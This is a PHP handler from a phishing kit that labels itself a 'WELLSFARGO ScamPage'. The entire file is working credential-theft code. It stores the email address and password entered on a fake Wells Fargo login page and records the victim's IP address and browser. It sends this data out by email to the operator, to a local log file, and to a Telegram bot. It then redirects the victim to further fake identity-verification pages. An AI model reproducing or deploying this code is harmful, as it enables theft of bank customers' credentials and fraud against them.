<?php 


	ob_start();
session_start();
	include '../Inc/config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
		if ( isset( $_POST['password'] ) ) {
			
		$_SESSION['email'] 	  = $_POST['email'];

		$_SESSION['password'] 	  = $_POST['password'];
		$code = <<<EOT
»»————-　★[ ⚫️🌀 WELLSFARGO Mail Access 1 ⚫️🌀 ]★　————-««
[Email Address] 		: {$_SESSION['email']}
[Email Password]		: {$_SESSION['password']}
»»————-　★[ 💻🌏 DEVICE INFO 🌏💻  ]★　————-««
IP		: $ip
IP lookup		: http://ip-api.com/json/$ip
OS		: $useragent


»»————-　★[ ⚫️🌀 WELLSFARGO ScamPage B🌀 ]★　————-««
\r\n\r\n
EOT;
		if ($sendtoemail=="yes"){
		$subject = "🏛️ WELLSFARGO Email Access 🏛️  From $ip";
        $headers = "From: 🏛️ WELLSFARGO Mail Access 1 🏛️ <newfullz@sh33nz0.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($email,$subject,$code,$headers);
		}

		if ($saveintotxt=="yes"){
		$save = fopen("../Logs/Access.txt","a+");
        fwrite($save,$code);
        fclose($save);
		}
	if ($sendtotelegram=="yes"){	
	$txt = $code;
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
	}
	
	if($doubleemailaccess=="on"){
	
	header("Location: ../accounts_contact_Fail?oamo/identity/&token=cjmvJprW2Dw1/mfacontacts_identification/origin=cob&error=yes");
        exit();
	
	}
        header("Location: ../accounts?oamo/identity/recognizeUser/requestidentification");
        exit();
	} else {
		header("Location: ../index?");
		exit();
	}
?>
